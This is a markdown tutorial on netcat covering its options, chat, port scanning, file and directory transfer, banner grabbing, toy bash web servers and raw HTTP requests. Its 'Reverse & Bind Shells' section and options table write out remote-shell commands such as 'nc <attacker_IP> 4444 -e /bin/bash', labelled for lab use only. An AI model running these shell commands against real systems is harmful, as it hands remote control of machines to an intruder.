- It can read/write data across network connections using TCP or UDP.
- The command differs depending on the system (netcat, nc, ncat, and others).
- On Ubuntu, the commands nc and netcat both work as symbolic links for the OpenBSD version of Netcat. On CentOS, Debian, and RHEL, the command is ncat.
- Common uses: port scanning, file transfer, banner grabbing, testing connections, debugging, and chat between systems.
- Netcat is a crucial tool to master for network and system administrators due to the rich connection troubleshooting features and scripting usability.
- Syntax:
  ```bash
  nc [options] [host] [port]
  ```
  - The <host> is either a numeric IP address or a symbolic hostname.
  - The <port> is either a numeric port or service name.
 
- Netcat has two working modes:
  - Connect mode. In connect mode, Netcat works as a client. The utility requires the <host> and <port> parameters.
  - Listen mode. In listen mode, Netcat works as a server. When <host> is omitted, Netcat listens on all available addresses for the specified port.

- Man
  ```bash
  man netcat
  ```

### Other Useful Options
| Option(s)                           | Description                                               | Notes / Example                                                          |
| ----------------------------------- | --------------------------------------------------------- | ------------------------------------------------------------------------ |
| `-4`                                | Force IPv4 only                                           | `nc -4 -v example.com 80`                                                |
| `-6`                                | Force IPv6 only                                           | `nc -6 -v example.com 80`                                                |
| `-U`, `--unixsock`                  | Use a Unix domain socket                                  | `nc -U /var/run/mysock` (implementation-dependent)                       |
| `-l`, `--listen`                    | Listen for incoming connections (server mode)             | `nc -l -p 1234`                                                          |
| `-p <port>`, `--source-port <port>` | Local/source port to bind to                              | `nc -l -p 5555` or `nc -p 4444 host 80`                                  |
| `-s <host>`, `--source <host>`      | Bind outgoing connection to a specific local IP/interface | `nc -s 192.168.1.10 host 80`                                             |
| `-u`                                | Use UDP instead of TCP                                    | `nc -u -l -p 53`                                                         |
| `-v`, `--verbose`                   | Verbose output                                            | `nc -v host 22`                                                          |
| `-vv`                               | Very verbose (extra detail)                               | `nc -vv host 22`                                                         |
| `-k`, `--keep-open`                 | Keep listening after handling a connection                | `nc -l -k -p 8080` (not in all builds)                                   |
| `-z`                                | Zero-I/O mode (scan only; do not send data)               | `nc -zv host 1-1024`                                                     |
| `-g <hop,hop,...>`                  | Set loose source routing hops (IPv4)                      | Rarely used; `-g 1.2.3.4,5.6.7.8` (implementation-specific)              |
| `-w <secs>`                         | Timeout for connects and final net reads                  | `nc -w 3 host 80`                                                        |
| `-n`                                | Do not resolve DNS (use numeric IPs)                      | `nc -n 8.8.8.8 53`                                                       |
| `-e <command>`                      | Execute command after connection (pipes stdin/stdout)     | `nc -l -p 4444 -e /bin/bash` — often disabled for security               |
| `-C`                                | Send CRLF as line-ending                                  | Useful for some text protocols (implementation-specific)                 |
| `-N`                                | Shutdown socket after EOF on stdin                        | Signals EOF to remote after sending input (some builds)                  |
| `-P <proxy>` / `-X <proxy-type>`    | Proxy support (ncat / enhanced builds)                    | `ncat --proxy 10.0.0.1:8080 --proxy-type http host 80`                   |
| `--send-only` / `--recv-only`       | Restrict direction of data flow (ncat/enhanced builds)    | `ncat --send-only host 80`                                               |
| `--version` / `--help`              | Show version or help text                                 | `nc --help` or `nc --version`                                            |
| (no flag)                           | Basic connect (client)                                    | `nc host 80` connects TCP by default                                     |
| (stdin redirection)                 | Send file / receive file                                  | Sender: `nc -l -p 5555 < file.txt` Receiver: `nc sender 5555 > file.txt` |

* Notes:
  - Multiple nc implementations exist (e.g., netcat-traditional, OpenBSD nc, ncat from Nmap). Flags and features differ between them — especially -e, -k, --unixsock, proxy flags, and -g.
  - Check your system: nc --help or man nc to confirm which options your binary supports.
  - -e (remote command execution) is dangerous and often removed from secure builds — use only in controlled lab environments.


### Commands

#### Client/Server Connection
- Simple Chat / Message Transfer --> both can type message and it will reflect on each other
* Listen on a specific port (server mode)
  ```bash
  ncat -l -v -p <port>
  ```
  - -l = listen
  - -v = verbos
  - -p = port
    
  ```bash
  ncat -l -v -p 1234
  ```
  - Listens on TCP port 1234 for incoming connections.

* Connect to a TCP port (client mode)
  ```bash
  ncat -v <target_IP> <port>
  ```
  ```bash
  ncat -v 192.168.1.10 80
  ```
  - Connects to port 80 (HTTP) on 192.168.1.10

* Specify protocol (TCP or UDP)
  ```bash
  ncat -l -u -p <port>     # UDP listener
  ncat -u <host> <port>    # UDP client
  ```
  ```bash
  ncat -u 192.168.1.10 53
  ```
* Send a message from either device, and the same message shows up on the other device. The client and server behave the same after the connection establishes.
  ```bash
  # Server
  [root@system5 ~]# ncat -lv 1234
  Ncat: Version 7.92 ( https://nmap.org/ncat )
  Ncat: Listening on :::1234
  Ncat: Listening on 0.0.0.0:1234
  Ncat: Connection from 192.168.29.80.
  Ncat: Connection from 192.168.29.80:33040.
  hello

  # Client
  [root@localhost ~]# ncat -v 192.168.29.73 1234
  Ncat: Version 7.92 ( https://nmap.org/ncat )
  Ncat: Connected to 192.168.29.73:1234.
  hello
  ```

  ```bash
  nc -lkv 1234
  ```
  - The -k option ensures the connection stays open after a disconnect.

#### Port Scanning(check port open or not)
* Scan a single port
  ```bash
  nc -zv <target> <port>
  nc -zv 192.168.1.1 22
  ```

* Scan multiple ports
  ```bash
  nc -zv <target> 20-80
  ```

* Scan multiple targets
  ```bash
  nc -zv 192.168.1.{1,2,3} 22-25
  ```

* Display only open ports
  ```bash
  nc -zvw 1 <target> 1-1024 2>&1 | grep succeeded
  ```

#### File Transfer
  ```bash
  touch file.txt
  ```
* Send file (sender side)
  ```bash
  nc -l -v -p 5555 < file.txt
  ```

* Receive file (receiver side)
  ```bash
  nc <sender_IP> 5555 > file.txt
  ```

* Transfer directories (with tar)
  ```bash
  # Sender:
  tar -czf - /path/to/dir | nc -l -p 5555
  
  # Receiver:
  nc <sender_IP> 5555 | tar -xzf -
  ```

  
#### Testing Connections and Debugging
* Check if a remote service is reachable
  ```bash
  nc -vz <host> <port>
  nc -zv google.com 443
  ```
  - The -z option ensures the connection does not persist.
  - If the ping succeeds, the output shows the successful connection message.
 
* Specify timeout
  ```bash
  nc -w <seconds> <host> <port>
  nc -w 3 8.8.8.8 53
  ```

* Send custom data
  ```bash
  echo "hello" | nc <host> <port>
  ```

#### Reverse & Bind Shells (for testing only)
* (⚠️ Legal note: Use these only in lab environments you own.)

* Bind Shell (server waits for connection)
  ```bash
  # On target machine
  nc -l -p 4444 -e /bin/bash
  # On attacker machine
  nc <target_IP> 4444

* Reverse Shell (target connects back)
  ```bash
  # On attacker machine
  nc -l -p 4444
  # On target machine
  nc <attacker_IP> 4444 -e /bin/bash
  ```

#### Banner Grabbing / Service Info
* Get banner from open port
  ```bash
  nc <target> <port>
  ```
  Example:
  ```bash
  nc scanme.nmap.org 80
  GET / HTTP/1.0
  ```
  - Press Enter twice to get the web server’s banner.

### Transfer Directory
* Transfer a directory using `tar` + `nc` (netcat), with useful options and a couple of variants for different `nc` implementations. run these on the two machines (A = sender, B = receiver). replace IP/port as needed.
  
* On the sender (machine A): create a sample directory (skip if you already have files)
  ```bash
  mkdir -p files
  touch files/file{1..5}.txt
  ```

* On the sender: change into the directory you want to send
  ```bash
  cd files
  ```

* On the receiver (machine B): create and enter the destination directory (optional — tar will create files relative to what you send)
  ```bash
  mkdir -p files_destination && cd files_destination
  ```

* On the receiver: start `nc` listening and pipe into `tar` to extract. two common `nc` variants are shown — use the one that matches your `nc`:

  * OpenBSD / modern `nc` (common on many Linux distros):
  ```bash
  nc -l -p 1234 | tar xpvf -
  ```

  * GNU netcat (older syntax) / busybox `nc`:
  ```bash
  nc -l 1234 | tar xpvf -
  ```

  * Explanation:
    * `nc -l -p 1234` (or `nc -l 1234`) listens on port 1234.
    * `tar xpvf -` reads the tar stream from stdin, `x`=extract, `p`=preserve permissions, `v`=verbose, `f -`=read from stdin.

* On the sender: send the directory with `tar` piped into `nc`

```bash
tar -cpf - . | nc -v 10.0.2.5 1234
```
* Explanation:
  * `tar -c` = create archive, `-p` = preserve permissions, `-f -` = write archive to stdout.
  * `nc -v 10.0.2.5 1234` connects to receiver IP `10.0.2.5` on port `1234`; `-v` is verbose so you see connection info.

* Optional: compress on the fly to save bandwidth
  ```bash
  tar -c . | gzip -c | nc -v 10.0.2.5 1234
  # on receiver:
  nc -l -p 1234 | gunzip -c | tar xpvf -
  ```

* Optional: show progress using `pv` (if installed)
  ```bash
  tar -cpf - . | pv | nc -v 10.0.2.5 1234
  # receiver:
  nc -l -p 1234 | tar xpvf -
  ```

* Verify files on the receiver after transfer
  ```bash
  ls -l
  # or recursively:
  find . -maxdepth 2 -type f -ls
  ```

* Troubleshooting & tips:
  * if `nc` fails to listen: check that the chosen port (e.g. 1234) is not blocked by a firewall on either side.
  * if `nc` complains about flags (`-p`/`-l` differences), try the alternate `nc` syntax above.
  * if you need to bind to a specific interface on the receiver, use the `-s` or `-l` + `-k` variants depending on your `nc` version — or just ensure the receiver’s IP is reachable.
  * `tar xpvf -` will overwrite files with the same name — back up if necessary.
  * this transfer is unencrypted — use only on trusted LANs. for secure transfers, prefer `tar -cf - . | ssh user@host "tar xpf -"` (SSH encrypts and authenticates).
  * if you want to send a single directory from outside its parent, use `tar -cpf - dirname | nc ...` or `tar -C /path/to/parent -cpf - dirname | nc ...`.

* Short example session (receiver then sender)
  * receiver:
  ```bash
  mkdir -p files_destination && cd files_destination
  nc -l -p 1234 | tar xpvf -
  ```

  * Sender:
  ```bash
  cd files
  tar -cpf - . | nc -v 10.0.2.5 1234
  ```

* Done — that will stream the tar archive over the network and extract immediately on the receiver.
* We can use ssh for more secure transfer.

### Examples
| Task                  | Command                            |
| --------------------- | ---------------------------------- |
| Check if port 22 open | `nc -zv 192.168.1.10 22`           |
| Listen on port 9000   | `nc -l -p 9000`                    |
| Connect to listener   | `nc <IP> 9000`                     |
| Send file             | `nc -l -p 5000 < file.txt`         |
| Receive file          | `nc <IP> 5000 > file.txt`          |
| Scan port range       | `nc -zv 192.168.1.1 1-1000`        |
| Get HTTP banner       | `nc example.com 80`                |
| Chat                  | `nc -l -p 1234` and `nc <IP> 1234` |
| Test UDP service      | `nc -u -vz 8.8.8.8 53`             |

---

### How to create a simple web server using Netcat (nc)

* **web server using Netcat (nc)** — perfect for understanding how HTTP works at a low level.

* **Step 1 – Start a basic Netcat “server”**
  ```bash
  nc -lv 10.0.2.4 1234
  ```
  * `-l` → listen mode
  * `-v` → verbose (shows connection info)
  * `10.0.2.4` → your device’s IP address (you can omit it to listen on localhost)
  * `1234` → port number to listen on
  
  Netcat will now wait for a connection on port 1234.

* **Step 2 – Connect from another device (the “client”)**

  * In a browser, go to:

    ```
    http://10.0.2.4:1234
    ```
  * Or use `curl`:

    ```bash
    curl 10.0.2.4:1234
    ```
  * The browser (or curl) sends an HTTP GET request to your Netcat listener.

---

* **Step 3 – Observe the request on the Netcat server**
  When the client connects, you’ll see something like this on your listening terminal:

  ```
  GET / HTTP/1.1
  Host: 10.0.2.4:1234
  User-Agent: curl/8.4.0
  Accept: */*
  ```

  This is a plain HTTP request from the client.

---

* **Step 4 – Send a manual HTTP response**
  Copy and paste the following **HTTP response** into the Netcat terminal (where it’s listening):

  ```
  HTTP/1.1 200 OK
  Server: netcat
  Content-Type: text/html; charset=UTF-8

  <!DOCTYPE html>
  <html>
  <head>
    <title>Netcat</title>
  </head>
  <body>
    <h1>A webpage served with nc</h1>
  </body>
  </html>
  ```

  * `HTTP/1.1 200 OK` → tells the browser the request succeeded.
  * `Content-Type` → specifies HTML content.
  * The blank line after the headers is **required** — it signals the end of HTTP headers.

---

* **Step 5 – View the result**

  * On the browser or the `curl` output, you’ll immediately see:

    ```html
    <!DOCTYPE html> ...
    <h1>A webpage served with nc</h1>
    ```
  * If you’re using a browser, it will render the HTML page visually.

---

* **Step 6 – Stop the server**

  * Press `CTRL + C` in the Netcat window to terminate the session.

---

**Tips & Notes**

* You can serve any static content manually using this technique — it’s just text over TCP.
* This setup handles **only one connection** at a time (Netcat closes after one client disconnects).
* For continuous serving, you can wrap Netcat in a loop:

  ```bash
  while true; do nc -lv -p 1234 < index.html; done
  ```

  *(Note: older nc uses `-p`; newer OpenBSD nc omits it)*
* This is an excellent demo of how **HTTP requests and responses** work under the hood — it’s not a production web server.


### Netcat-based web server to serve multiple HTML files automatically, just like a tiny version of Apache or Nginx — but entirely with bash + nc.

* **Netcat-based web server** to serve **multiple HTML files automatically**, just like a tiny version of Apache or Nginx — but entirely with `bash` + `nc`.

##### **Concept**
Netcat can only serve one connection at a time, so we’ll wrap it in a `while` loop that:
1. Waits for a client request.
2. Reads the requested file name (like `/about.html`).
3. Sends the corresponding HTML file as an HTTP response.
4. Loops again for the next request.

##### **Step-by-Step Implementation**
* **1. Create your HTML files**
In a directory (say `webserver/`), create multiple HTML files:

```bash
mkdir webserver && cd webserver

# Main page
cat > index.html <<EOF
<!DOCTYPE html>
<html>
<head><title>Home</title></head>
<body>
<h1>Welcome to Netcat Web Server</h1>
<p><a href="/about.html">About</a></p>
<p><a href="/contact.html">Contact</a></p>
</body>
</html>
EOF

# About page
cat > about.html <<EOF
<!DOCTYPE html>
<html>
<head><title>About</title></head>
<body>
<h1>About Us</h1>
<p>This is a simple Netcat-based web server demo.</p>
</body>
</html>
EOF

# Contact page
cat > contact.html <<EOF
<!DOCTYPE html>
<html>
<head><title>Contact</title></head>
<body>
<h1>Contact</h1>
<p>Email us at: contact@example.com</p>
</body>
</html>
EOF
```

* **2. Create a simple Netcat web server script**
Create a file named `nc_server.sh`:
```bash
#!/bin/bash

PORT=1234

echo "Starting Netcat Web Server on port $PORT..."
while true; do
  # Wait for connection and read first line (the HTTP request)
  REQUEST=$(nc -l -p $PORT | while read line; do
    # Capture only the first line of the request
    echo "$line"
    break
  done)

  # Extract requested file from HTTP GET line
  FILE=$(echo "$REQUEST" | awk '{print $2}' | sed 's/^\///')

  # Default to index.html if nothing requested
  [ -z "$FILE" ] && FILE="index.html"

  # If file exists, serve it
  if [ -f "$FILE" ]; then
    echo "Serving $FILE"
    {
      echo -e "HTTP/1.1 200 OK\r"
      echo -e "Server: netcat\r"
      echo -e "Content-Type: text/html; charset=UTF-8\r"
      echo -e "\r"
      cat "$FILE"
    } | nc -l -p $PORT
  else
    echo "File not found: $FILE"
    {
      echo -e "HTTP/1.1 404 Not Found\r"
      echo -e "Server: netcat\r"
      echo -e "Content-Type: text/html; charset=UTF-8\r"
      echo -e "\r"
      echo "<h1>404 - File Not Found</h1>"
    } | nc -l -p $PORT
  fi
done
```

Make it executable:

```bash
chmod +x nc_server.sh
```

---

#### **3. Run the server**

```bash
./nc_server.sh
```

You’ll see:

```
Starting Netcat Web Server on port 1234...
```

---

#### **4. Access from browser or curl**

* Open your browser and go to:

  ```
  http://<your_ip>:1234
  ```
* Or from another terminal:

  ```bash
  curl http://10.0.2.4:1234
  curl http://10.0.2.4:1234/about.html
  curl http://10.0.2.4:1234/contact.html
  ```

You’ll get the correct HTML page each time.

---

#### **5. Stop the server**

Press `CTRL + C` to stop it.

---

### **Notes & Enhancements**

* This approach uses plain `bash` + `nc` — no web server software.
* It’s **single-threaded** — serves one request at a time.
* You can use **OpenBSD Netcat** syntax without `-p` if your version doesn’t support it:

  ```bash
  nc -l $PORT
  ```
* To make it handle multiple requests faster, you can combine it with `xinetd` or `socat` for more advanced setups.
* For a real-world learning step-up, try replacing `nc` with `ncat` (from Nmap) — it supports SSL (`--ssl`) and more options.

---

### **polished, smarter version** of the Netcat Web Server script.
This one:
* Detects whether your system uses **OpenBSD netcat** or **GNU netcat** automatically.
* Handles **multiple files (index.html, about.html, etc.)** correctly.
* Uses **a single listener per request**, no redundant listening.
* Automatically sends **404 Not Found** for missing files.
* Works on **almost all Linux distros** (RHEL, Ubuntu, etc.).


##### 🧠 **Smart Netcat Web Server Script**
Save this as `nc_webserver.sh`:
```bash
#!/bin/bash

# Simple Netcat Web Server (compatible with OpenBSD & GNU nc)
# Author: ChatGPT (GPT-5)
# Description: Minimal HTTP 1.1 web server using bash + netcat

PORT=1234
DOCROOT="$(pwd)"

# Detect netcat version
if nc -h 2>&1 | grep -q "OpenBSD"; then
  NC_CMD="nc -l -p $PORT"
  echo "[INFO] Detected OpenBSD Netcat"
elif nc -h 2>&1 | grep -q "GNU"; then
  NC_CMD="nc -l -p $PORT"
  echo "[INFO] Detected GNU Netcat"
else
  NC_CMD="nc -l -p $PORT"
  echo "[INFO] Defaulting to generic Netcat syntax"
fi

echo "[INFO] Serving files from: $DOCROOT"
echo "[INFO] Web Server started on port $PORT..."
echo "-------------------------------------------"

# Infinite loop to serve multiple clients
while true; do
  # Listen for connection and handle request
  $NC_CMD -v | {
    # Read the first line of HTTP request
    read REQUEST
    METHOD=$(echo "$REQUEST" | awk '{print $1}')
    FILE=$(echo "$REQUEST" | awk '{print $2}' | sed 's/^\///')

    # Default to index.html if no file requested
    [ -z "$FILE" ] && FILE="index.html"

    echo "[REQ] $METHOD $FILE"

    # Build HTTP response
    if [ -f "$DOCROOT/$FILE" ]; then
      {
        echo -e "HTTP/1.1 200 OK\r"
        echo -e "Server: Netcat-Bash\r"
        echo -e "Content-Type: text/html; charset=UTF-8\r"
        echo -e "Connection: close\r"
        echo -e "\r"
        cat "$DOCROOT/$FILE"
      }
      echo "[OK] Served: $FILE"
    else
      {
        echo -e "HTTP/1.1 404 Not Found\r"
        echo -e "Server: Netcat-Bash\r"
        echo -e "Content-Type: text/html; charset=UTF-8\r"
        echo -e "Connection: close\r"
        echo -e "\r"
        echo "<h1>404 Not Found</h1>"
        echo "<p>The requested file '$FILE' was not found.</p>"
      }
      echo "[ERR] Missing: $FILE"
    fi
  }
  echo "-------------------------------------------"
done
```

##### ⚙️ **Make It Executable**
```bash
chmod +x nc_webserver.sh
```

##### 🌐 **Run the Server**

```bash
./nc_webserver.sh
```

You’ll see:
```
[INFO] Detected GNU Netcat
[INFO] Serving files from: /home/user/webserver
[INFO] Web Server started on port 1234...
-------------------------------------------
```

##### 🧩 **Test It**
In your browser or using `curl`:
```bash
curl http://<your_ip>:1234
curl http://<your_ip>:1234/about.html
curl http://<your_ip>:1234/contact.html
curl http://<your_ip>:1234/doesnotexist.html
```
* It will serve your `.html` files.
* If a file is missing, you’ll get:
  ```
  404 Not Found
  ```

##### 🛠 **Customization Tips**
* To change port:
  ```bash
  ./nc_webserver.sh 8080
  ```
  (You can modify the script to read `$1` as a port argument.)

* To serve from another folder:
  ```bash
  cd /path/to/your/website
  ./nc_webserver.sh
  ```
* To make it quieter (no logs), remove the `echo [INFO]/[REQ]` lines.
* To serve non-HTML files (like `.txt`, `.css`, `.js`), you can detect MIME type:
  ```bash
  TYPE=$(file --mime-type -b "$DOCROOT/$FILE")
  echo -e "Content-Type: $TYPE\r"
  ```

##### 🚀 **Example Output**
```
[REQ] GET index.html
[OK] Served: index.html
-------------------------------------------
[REQ] GET about.html
[OK] Served: about.html
-------------------------------------------
[REQ] GET contact.html
[OK] Served: contact.html
-------------------------------------------
[REQ] GET missing.html
[ERR] Missing: missing.html
-------------------------------------------
```


### **Simple Chat Server Using Netcat**
Netcat can be used to create a **simple real-time chat system** between two devices over the network.
**Step 1:** Start the chat server on **Device 1** (Bob):

```bash
awk -W interactive '$0="Bob: "$0' | nc -lv 1234
```

* `awk -W interactive` makes `awk` send output immediately.
* The command prefixes every line you type with `"Bob: "`.
* `nc -lv 1234` starts Netcat in **listening mode** on port **1234**.

When Device 1 runs this, it waits for a connection.

---

**Step 2:** Connect from **Device 2** (Alice):

```bash
awk -W interactive '$0="Alice: "$0' | nc 10.0.2.4 1234
```

* Replace **10.0.2.4** with the IP address of Device 1.
* Each line Alice types is prefixed with `"Alice: "`.

---

**Step 3:** Chat between devices

* Type messages on either side to send them instantly.
* Bob’s terminal shows messages from Alice, and Alice’s terminal shows Bob’s responses.
* Each user sees only the *other person’s* messages (their own input doesn’t echo).

Example output:

```
Alice: Hi Bob!
Bob: Hey Alice, how are you?
Alice: Doing great! Testing Netcat chat.
```

This demonstrates how Netcat can be used for **simple peer-to-peer chat communication** over TCP.

---

### **Send an HTTP Request Using Netcat**

You can also use Netcat to send **raw HTTP requests** to a web server.

**Example:**

```bash
printf "GET / HTTP/1.0\r\n\r\n" | nc -v google.com 80
```

* `printf` sends an HTTP GET request.
* `nc -v google.com 80` connects to Google’s web server on port **80** (HTTP).
* The response prints the HTTP headers and part of the page content.

**Sample Output:**

```
GET / HTTP/1.0
Host: google.com
Connection: close

HTTP/1.0 302 Found
Location: http://www.google.com/
Content-Type: text/html; charset=UTF-8
```

Most modern sites use **HTTPS (port 443)**, so plain Netcat may return redirects or 404 pages — but this example demonstrates the **basic working of HTTP over TCP**.


